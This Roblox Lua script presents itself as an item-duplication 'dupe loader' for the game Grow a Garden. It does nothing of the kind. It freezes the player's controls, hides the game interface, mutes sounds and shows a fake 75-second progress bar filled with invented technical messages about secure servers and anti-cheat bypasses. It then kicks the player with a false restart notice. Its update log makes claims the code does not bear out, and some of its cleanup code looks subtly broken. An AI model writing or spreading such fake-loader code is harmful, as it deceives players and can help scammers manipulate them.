-- Hookzy GaG Dupe Loader v3.0 (Asset Loading & Setup Phase)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Store references to disabled custom GUIs
local disabledCustomGuis = {}
local mutedSounds = {}
local soundConnections = {}
local guiConnections = {}

-- Disable player movement and camera control
local function disableMovement()
	-- Disable controls for PC
	if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
		player.Character.Humanoid.WalkSpeed = 0
		player.Character.Humanoid.JumpPower = 0
		player.Character.Humanoid.AutoRotate = false
	end

	-- Disable controls for all devices (mobile, console)
	if player:FindFirstChild("PlayerScripts") then
		local controlModule = require(player.PlayerScripts:FindFirstChild("PlayerModule")):GetControls()
		controlModule:Disable()
	end

	-- For mobile, hide the move joystick UI if present
	local joystick = playerGui:FindFirstChild("TouchGui") or playerGui:FindFirstChild("TouchControls")
	if joystick then
		joystick.Enabled = false
	end
end

disableMovement()

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HookzyLoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- Black fade frame before loading screen appears
local fadeFrame = Instance.new("Frame")
fadeFrame.Size = UDim2.new(1, 0, 1, 0)
fadeFrame.Position = UDim2.new(0, 0, 0, 0)
fadeFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
fadeFrame.BackgroundTransparency = 1
fadeFrame.BorderSizePixel = 0
fadeFrame.ZIndex = 999998
fadeFrame.Parent = screenGui

-- Background frame with blur effect (loading screen)
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
bg.BackgroundTransparency = 1
bg.BorderSizePixel = 0
bg.ZIndex = 999999
bg.Parent = screenGui

local blurEffect = Instance.new("BlurEffect")
blurEffect.Size = 0
blurEffect.Parent = workspace.CurrentCamera

local bgGradient = Instance.new("UIGradient")
bgGradient.Rotation = 90
bgGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 25)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 45)),
}
bgGradient.Parent = bg

local mainText = Instance.new("TextLabel")
mainText.AnchorPoint = Vector2.new(0.5, 0.5)
mainText.Position = UDim2.new(0.5, 0, 0.25, 0)
mainText.Size = UDim2.new(0.75, 0, 0.12, 0)
mainText.BackgroundTransparency = 1
mainText.Text = "GaG Dupe Script"
mainText.TextColor3 = Color3.fromRGB(255, 255, 255)
mainText.Font = Enum.Font.GothamBlack
mainText.TextScaled = true
mainText.TextStrokeColor3 = Color3.new(0, 0, 0)
mainText.TextStrokeTransparency = 0.3
mainText.ZIndex = 999999
mainText.Parent = bg

local authorText = Instance.new("TextLabel")
authorText.AnchorPoint = Vector2.new(0, 0)
authorText.Position = UDim2.new(0.05, 0, 0.8, 0)
authorText.Size = UDim2.new(0.3, 0, 0.06, 0)
authorText.BackgroundTransparency = 1
authorText.Text = "Made by Hookzy"
authorText.TextColor3 = Color3.fromRGB(160, 160, 160)
authorText.Font = Enum.Font.Gotham
authorText.TextScaled = true
authorText.TextXAlignment = Enum.TextXAlignment.Left
authorText.ZIndex = 999999
authorText.Parent = bg

local updateLog = Instance.new("Frame")
updateLog.AnchorPoint = Vector2.new(1, 1)
updateLog.Position = UDim2.new(0.98, 0, 0.95, 0)
updateLog.Size = UDim2.new(0, 280, 0, 110)
updateLog.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
updateLog.BorderSizePixel = 0
updateLog.BackgroundTransparency = 0.15
updateLog.ZIndex = 999999
updateLog.Parent = bg

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = updateLog

local updateLabel = Instance.new("TextLabel")
updateLabel.Size = UDim2.new(1, -15, 1, -15)
updateLabel.Position = UDim2.new(0, 10, 0, 10)
updateLabel.BackgroundTransparency = 1
updateLabel.Text = [[- Update v3.0 (07/13/2025):
- Added Pet Mutations to dupe
- Bypass anti cheat
- Backend server code improvements
- Slower dupe load
- Backend validation
- Realistic progress bar
- ~30s dupe prep time
- + more
]]
updateLabel.TextColor3 = Color3.fromRGB(210, 210, 210)
updateLabel.TextWrapped = true
updateLabel.TextXAlignment = Enum.TextXAlignment.Left
updateLabel.TextYAlignment = Enum.TextYAlignment.Top
updateLabel.Font = Enum.Font.Gotham
updateLabel.TextSize = 14
updateLabel.ZIndex = 999999
updateLabel.Parent = updateLog

local versionText = Instance.new("TextLabel")
versionText.AnchorPoint = Vector2.new(1, 1)
versionText.Position = UDim2.new(1, -15, 1, -15)
versionText.Size = UDim2.new(0, 70, 0, 28)
versionText.BackgroundTransparency = 1
versionText.Text = "v3.0"
versionText.TextColor3 = Color3.fromRGB(200, 200, 200)
versionText.Font = Enum.Font.GothamSemibold
versionText.TextScaled = true
versionText.TextTransparency = 0.1
versionText.ZIndex = 999999
versionText.Parent = bg

local statusText = Instance.new("TextLabel")
statusText.AnchorPoint = Vector2.new(0.5, 0.5)
statusText.Position = UDim2.new(0.5, 0, 0.48, 0)
statusText.Size = UDim2.new(0.7, 0, 0.07, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "Initializing asset loader..."
statusText.TextColor3 = Color3.fromRGB(190, 190, 190)
statusText.Font = Enum.Font.GothamMedium
statusText.TextScaled = true
statusText.ZIndex = 999999
statusText.Parent = bg

local barContainer = Instance.new("Frame")
barContainer.AnchorPoint = Vector2.new(0.5, 0.5)
barContainer.Position = UDim2.new(0.5, 0, 0.58, 0)
barContainer.Size = UDim2.new(0.65, 0, 0.05, 0)
barContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barContainer.BorderSizePixel = 0
barContainer.ClipsDescendants = true
barContainer.ZIndex = 999999
barContainer.Parent = bg

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 12)
barCorner.Parent = barContainer

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 999999
barFill.Parent = barContainer

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 12)
fillCorner.Parent = barFill

local fillGradient = Instance.new("UIGradient")
fillGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 255)),
}
fillGradient.Rotation = 90
fillGradient.Parent = barFill

-- Progress count label (e.g., 0/158)
local progressCount = Instance.new("TextLabel")
progressCount.AnchorPoint = Vector2.new(0.5, 0.5)
progressCount.Position = UDim2.new(0.5, 0, 0.68, 0)
progressCount.Size = UDim2.new(0.15, 0, 0.05, 0)
progressCount.BackgroundTransparency = 1
progressCount.Text = "0/158"
progressCount.TextColor3 = Color3.fromRGB(170, 170, 170)
progressCount.Font = Enum.Font.Gotham
progressCount.TextScaled = true
progressCount.ZIndex = 999999
progressCount.Parent = bg

-- Music setup for the loading screen (will play over muted game sounds)
local music = Instance.new("Sound")
music.SoundId = "rbxassetid://9046864489"
music.Volume = 0.25 -- softer volume
music.Looped = true
music.Name = "DupeTheme"
music.Parent = playerGui


-- Sound muting logic
local function muteSound(sound)
    if sound:IsA("Sound") and sound ~= music then
        if sound.Volume > 0 then
            sound:Stop()
            sound.Volume = 0
            table.insert(mutedSounds, sound)
        end
    end
end

local function muteAllGameSounds()
    for _, instance in ipairs(game:GetDescendants()) do
        muteSound(instance)
    end
    soundConnections.gameDescendantAdded = game.DescendantAdded:Connect(function(newChild)
        muteSound(newChild)
    end)
end

local function unmuteAllGameSounds()
    for _, sound in ipairs(mutedSounds) do
        if sound and sound:IsA("Sound") then
            sound.Volume = 1
        end
    end
    table.clear(mutedSounds)
    if soundConnections.gameDescendantAdded then
        soundConnections.gameDescendantAdded:Disconnect()
        soundConnections.gameDescendantAdded = nil
    end
end

-- Function to hide all existing ScreenGuis and handle new ones
local function hideGuiElements()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    for _, gui in ipairs(playerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Name ~= screenGui.Name then
            if gui.Enabled then
                gui.Enabled = false
                table.insert(disabledCustomGuis, gui)
            end
        end
    end
    guiConnections.playerGuiChildAdded = playerGui.ChildAdded:Connect(function(child)
        if child:IsA("ScreenGui") and child.Name ~= screenGui.Name then
            if child.Enabled then
                child.Enabled = false
                table.insert(disabledCustomGuis, child)
            end
        end
    end)
    local backpackGui = playerGui:FindFirstChild("BackpackGui")
    if backpackGui then backpackGui.Enabled = false end
    guiConnections.backpackGuiAdded = playerGui.ChildAdded:Connect(function(child)
        if child.Name == "BackpackGui" then
            child.Enabled = false
        end
    end)
end

-- Function to re-enable previously hidden GUIs
local function reenableGuiElements()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    for _, gui in ipairs(disabledCustomGuis) do
        if gui and gui:IsA("ScreenGui") then
            gui.Enabled = true
        end
    end
    table.clear(disabledCustomGuis)
    for _, connection in pairs(guiConnections) do
        if connection and typeof(connection) == "RBXScriptConnection" then
            connection:Disconnect()
        end
    end
    table.clear(guiConnections)
end

-- EXECUTE HIDING/MUTING LOGIC
hideGuiElements()
muteAllGameSounds()


-- Fade in sequence
TweenService:Create(fadeFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
task.wait(0.5)
TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
TweenService:Create(blurEffect, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {Size = 12}):Play()
TweenService:Create(fadeFrame, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()

music:Play()
TweenService:Create(music, TweenInfo.new(2.5, Enum.EasingStyle.Sine), {Volume = 0.25}):Play()

-- Believable asset loading texts
local backendTexts = {
    -- Phase 1: Initializing and establishing connection (15-20s)
	"Establishing secure connection to asset server (DNS-SEC)...",
	"Verifying script integrity and digital signature...",
	"Loading primary configuration modules...",
	"Fetching current game version data (v1.234.5)...",
	"Initializing anti-detection protocols (Layer 7)...",
	"Syncing local asset manifest with remote repository...",
	"Preparing secure data channels for asset transfer...",
	"Pre-loading core UI components for GUI integration...",
    "Retrieving unique item identifiers (UUIDs)...",
    "Mapping item properties to local database...",
    "Validating pet UUID schemas and mutation data...",
    "Decompressing bundled asset files...",
    "Allocating memory for script execution environment...",
    "Running checksum validation on downloaded modules...",

    -- Phase 2: Deep asset indexing/optimization (20-30s)
    "Indexing all available game assets (models, textures, sounds)...",
    "Optimizing network parameters for large asset downloads...",
    "Cross-referencing item rarity and attribute tables...",
    "Generating dynamic asset pointers...",
    "Caching frequently accessed asset data...",
    "Compiling internal lookup dictionaries...",
    "Performing integrity check on pet mutation data...",
    "Building asset dependency graphs...",
    "Establishing secure WebSocket connection for real-time updates...",
    "Finalizing internal data structures...",
    "Preparing asset rendering pipelines...",
    "Applying client-side optimizations...",

    -- Phase 3: Finalizing loader setup (15-20s)
    "Finalizing asset loader initialization...",
    "Running post-load integrity verification...",
    "Preparing runtime environment for user interface...",
    "Securing all communication channels...",
    "Loader setup complete. Ready for GUI activation.",
}

-- Adjust totalSteps based on the number of backendTexts for more granular progress
local totalSteps = #backendTexts * 5 -- Make totalSteps significantly higher for finer bar movement
local totalDuration = 75 -- seconds total loading time approx (e.g., 75 seconds)

-- Randomize slight timing for each increment to simulate real load
local function waitRandom(min, max)
	task.wait(math.random(min * 1000, max * 1000) / 1000)
end

local function simulateLoading()
	local currentProgress = 0
	local currentCount = 0
	local stepCount = #backendTexts

	for i = 1, stepCount do
		statusText.Text = backendTexts[i]
		local targetProgress = i / stepCount

		local tweenTime = (totalDuration / stepCount) * (0.75 + math.random() * 0.5)
        if i == math.floor(stepCount * 0.5) then
            tweenTime = tweenTime * 1.5 -- Slightly longer pause in the middle
        end

		local startTick = tick()
		local startProgress = currentProgress
		local targetCount = math.floor(totalSteps * targetProgress)
		local startCount = currentCount

		while tick() - startTick < tweenTime do
			local elapsed = tick() - startTick
			local alpha = elapsed / tweenTime

			local progressAlpha = alpha ^ 0.8 + (math.sin(elapsed * 15) * 0.015)
			if progressAlpha > 1 then progressAlpha = 1 end
			currentProgress = startProgress + (targetProgress - startProgress) * progressAlpha
			barFill.Size = UDim2.new(currentProgress, 0,1, 0)

			currentCount = math.floor(startCount + (targetCount - startCount) * alpha)
			progressCount.Text = string.format("%d/%d", currentCount, totalSteps)

			task.wait(0.03)
		end

		currentProgress = targetProgress
		barFill.Size = UDim2.new(currentProgress, 0, 1, 0)
		currentCount = targetCount
		progressCount.Text = string.format("%d/%d", currentCount, totalSteps)

		waitRandom(0.1, 0.3)
	end

	-- Finalize loading message
	statusText.Text = "Asset loading complete. Loader ready!"
	progressCount.Text = string.format("%d/%d", totalSteps, totalSteps)
	barFill.Size = UDim2.new(1, 0, 1, 0)
    task.wait(2) -- Let them see the completion message

    statusText.Text = "Rejoin the game and execute the script again to open the GaG Dupe GUI!"
    task.wait(4) -- Give ample time to read the instructions
end

simulateLoading()

-- Cleanup fade out and enable controls again (optional)
local function cleanup()
	TweenService:Create(bg, TweenInfo.new(1, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
	TweenService:Create(barFill, TweenInfo.new(1, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 0, 1, 0)}):Play()
	TweenService:Create(statusText, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
	TweenService:Create(progressCount, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
	TweenService:Create(updateLog, TweenInfo.new(1, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
	TweenService:Create(authorText, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
	TweenService:Create(mainText, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
	TweenService:Create(versionText, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()

	TweenService:Create(blurEffect, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {Size = 0}):Play()

	task.wait(1.2)
	screenGui:Destroy()
	blurEffect:Destroy()
	music:Stop()
	music:Destroy()

	-- Enable player movement again
	if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
		player.Character.Humanoid.WalkSpeed = 16
		player.Character.Humanoid.JumpPower = 50
		player.Character.Humanoid.AutoRotate = true
	end

	-- Enable mobile joystick if present
	if playerGui:FindFirstChild("TouchGui") then
		playerGui.TouchGui.Enabled = true
	end
	if playerGui:FindFirstChild("TouchControls") then
		playerGui.TouchControls.Enabled = true
	end

	reenableGuiElements()
    unmuteAllGameSounds()

	-- Re-enable control module if disabled
	if player:FindFirstChild("PlayerScripts") then
		local success, playerModule = pcall(function()
			return require(player.PlayerScripts:FindFirstChild("PlayerModule"))
		end)
		if success and playerModule then
			local controls = playerModule:Enable() -- Corrected: Should be Enable()
		end
	end
end

-- Run cleanup after short delay to allow messages to be read before kick
task.delay(1, cleanup)

-- The kick message (now less "error" and more "instructional restart")
player:Kick("Client reboot required to load GaG Dupe GUI assets.")
